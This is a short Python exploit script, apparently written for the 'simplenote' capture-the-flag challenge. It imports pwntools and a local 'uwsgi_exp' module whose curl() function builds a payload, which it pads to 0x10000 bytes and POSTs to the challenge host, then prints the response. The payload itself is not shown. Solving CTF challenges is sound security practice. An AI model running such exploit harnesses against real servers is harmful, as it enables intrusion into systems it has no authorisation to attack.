from hyper import HTTPConnection
from hyper.contrib import HTTP20Adapter
from uwsgi_exp import curl
import requests
from pwn import *
s = requests.Session()
url = 'http://localhost:18888/'
url = 'http://simplenote.chal.perfect.blue/'
r = s.post(url, data=curl().ljust(0x10000))
print(r)
print(r.content)
